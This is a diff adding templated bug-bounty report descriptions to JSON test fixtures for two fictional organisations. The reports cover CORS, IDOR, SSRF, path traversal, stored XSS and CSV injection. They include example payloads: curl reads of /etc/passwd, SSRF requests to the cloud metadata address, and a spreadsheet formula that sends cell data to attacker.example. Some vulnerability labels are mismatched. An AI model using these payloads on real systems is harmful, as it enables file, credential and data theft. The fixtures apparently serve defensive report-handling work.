+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenlichtmed.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23574,7 +23750,8 @@
           "offset": "6d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenlichtmed.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23698,7 +23875,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23833,7 +24011,8 @@
           "offset": "4d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23984,7 +24163,8 @@
           "offset": "4d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24090,7 +24270,8 @@
           "offset": "2d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.alpenlichtmed.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24218,7 +24399,8 @@
           "offset": "23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24341,7 +24523,8 @@
           "offset": "1d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/alpenquell_wasserwerke_ag_reports.json b/fixtures/reports/alpenquell_wasserwerke_ag_reports.json
index 95cc458..511d76c 100644
--- a/fixtures/reports/alpenquell_wasserwerke_ag_reports.json
+++ b/fixtures/reports/alpenquell_wasserwerke_ag_reports.json
@@ -74,7 +74,8 @@
           "offset": "4d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -242,7 +243,8 @@
           "offset": "3d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -361,7 +363,8 @@
           "offset": "5d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -469,7 +472,8 @@
           "offset": "2d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -588,7 +592,8 @@
           "offset": "1d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -704,7 +709,8 @@
           "offset": "4d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -791,7 +797,8 @@
           "offset": "2d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/import`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -892,7 +899,8 @@
           "offset": "3d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1039,7 +1047,8 @@
           "offset": "8d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1158,7 +1167,8 @@
           "offset": "1d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1280,7 +1290,8 @@
           "offset": "2d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1404,7 +1415,8 @@
           "offset": "22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1526,7 +1538,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1659,7 +1672,8 @@
           "offset": "4d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1786,7 +1800,8 @@
           "offset": "3d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1902,7 +1917,8 @@
           "offset": "17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2038,7 +2054,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2177,7 +2194,8 @@
           "offset": "2d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2321,7 +2339,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2476,7 +2495,8 @@
           "offset": "4d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/api/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2587,7 +2607,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2735,7 +2756,8 @@
           "offset": "6d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2851,7 +2873,8 @@
           "offset": "1d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
